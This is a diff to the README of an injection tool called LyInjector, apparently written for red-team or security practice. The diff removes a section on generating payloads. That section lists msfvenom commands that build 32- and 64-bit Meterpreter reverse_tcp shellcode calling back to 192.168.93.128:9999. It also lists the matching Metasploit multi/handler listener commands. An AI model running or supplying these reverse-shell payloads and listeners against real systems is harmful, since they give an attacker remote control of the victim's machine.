@@ -351,33 +351,6 @@ C:\Users\admin>LyInjector RepairShellOep --path d://lyshark.exe
 [+] 修正新入口地址: 0x0007C4CE
 ```
 
-- Metasploit 生成载荷
-
-通过`Metasploit`工具生成一个有效载荷，如下是32位与64位载荷生成命令。
-```BASH
-32位载荷生成
-[root@lyshark ~]# msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.93.128 LPORT=9999 -f c
-
-64位载荷生成
-[root@lyshark ~]# msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.93.128 LPORT=9999 -f c
-```
-后台侦听器的配置也分为`32`位与`6`4位，使用工具时需要与载荷的位数相对应。
-```BASH
-32位侦听器配置
-msf6 > use exploit/multi/handler
-msf6 > set payload windows/meterpreter/reverse_tcp
-msf6 > set lhost 192.168.93.128
-msf6 > set lport 9999
-msf6 exploit(multi/handler) > exploit
-
-64位侦听器配置
-msf6 > use exploit/multi/handler
-msf6 > set payload windows/x64/meterpreter/reverse_tcp
-msf6 > set lhost 192.168.93.128
-msf6 > set lport 9999
-msf6 exploit(multi/handler) > exploit
-```
-
 ## 项目地址
 
 https://github.com/lyshark/LyInjector
